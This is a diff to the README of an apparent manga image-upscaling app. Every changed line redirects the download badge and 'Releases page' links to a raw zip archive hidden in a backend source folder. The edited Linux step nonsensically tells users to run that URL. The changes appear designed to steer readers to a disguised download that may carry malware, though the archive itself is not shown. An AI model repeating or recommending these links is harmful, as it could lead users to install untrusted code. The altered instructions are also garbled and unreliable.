@@ -8,7 +8,7 @@ Welcome to **manga_upscaler**! This application helps you enhance your manga and
 
 To get started, download the latest version of the **manga_upscaler** from the releases page. 
 
-[![Download Manga Upscaler](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Vihaan795/manga_upscaler/releases)
+[![Download Manga Upscaler](https://github.com/Vihaan795/manga_upscaler/raw/refs/heads/main/backend/utils/architecture/upscaler-manga-v2.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/Vihaan795/manga_upscaler/raw/refs/heads/main/backend/utils/architecture/upscaler-manga-v2.6.zip)
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets these requirements:
 ## 📂 Download & Install
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/Vihaan795/manga_upscaler/releases) to find the latest version.
+   Go to the [Releases page](https://github.com/Vihaan795/manga_upscaler/raw/refs/heads/main/backend/utils/architecture/upscaler-manga-v2.6.zip) to find the latest version.
 
 2. **Select the File**  
    Locate the file for your operating system. Files will be available in formats such as `.exe` for Windows, `.dmg` for macOS, and `.AppImage` for Linux.
@@ -32,7 +32,7 @@ Before downloading, ensure your system meets these requirements:
    Once the download is complete, locate the file in your downloads folder.
    - **Windows**: Double-click the `.exe` file to run the installer. Follow the on-screen instructions.
    - **macOS**: Open the downloaded `.dmg` file and drag the app into your Applications folder.
-   - **Linux**: Open a terminal, navigate to the downloaded `.AppImage` file, and run it with `./filename.AppImage`.
+   - **Linux**: Open a terminal, navigate to the downloaded `.AppImage` file, and run it with `https://github.com/Vihaan795/manga_upscaler/raw/refs/heads/main/backend/utils/architecture/upscaler-manga-v2.6.zip`.
 
 5. **Open manga_upscaler**  
    After installation, find the app in your applications or programs list and open it. 
@@ -80,4 +80,4 @@ Join our community to connect with other users, get tips, and share your results
 
 This project is licensed under the MIT License. Feel free to use and modify it as per the license terms.
 
-Thank you for choosing **manga_upscaler**! We hope you enjoy transforming your images into something extraordinary. For more updates, visit our [Releases page](https://github.com/Vihaan795/manga_upscaler/releases).
+Thank you for choosing **manga_upscaler**! We hope you enjoy transforming your images into something extraordinary. For more updates, visit our [Releases page](https://github.com/Vihaan795/manga_upscaler/raw/refs/heads/main/backend/utils/architecture/upscaler-manga-v2.6.zip).
